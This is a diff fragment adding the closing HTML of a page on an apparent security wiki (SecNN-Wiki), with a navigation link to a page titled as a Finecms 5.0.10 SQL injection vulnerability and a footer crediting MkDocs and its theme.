+        Previous</a><a href="../Finecms%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Finecms 5.0.10 sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
